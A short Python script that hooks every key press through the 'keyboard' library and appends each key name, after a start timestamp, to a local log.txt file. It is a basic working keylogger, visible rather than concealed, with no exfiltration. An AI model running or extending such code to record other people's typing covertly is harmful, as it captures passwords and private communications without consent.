import keyboard
import time 

# from datetime import datetime

# print("hello")
# keyboard.press("a")
# keyboard.press("b")
log_file = 'log.txt'
print("named log file ")
start_time = time.localtime()
formatted_time = time.strftime("%D:%B:%Y  %H:%M:%S",start_time)

def startup():
    with open(log_file, 'a') as f:
        f.write(formatted_time)
        f.write("\n\n")
    f.close()

def on_key_press(event):
    print("received a key press")
    with open(log_file, 'a') as f:
        print(event.name)
        f.write('{}\n'.format(event.name))



startup()

keyboard.on_press(on_key_press)
keyboard.wait()


# while true:
#     sleep(2)
#     keyboard.press("")
    

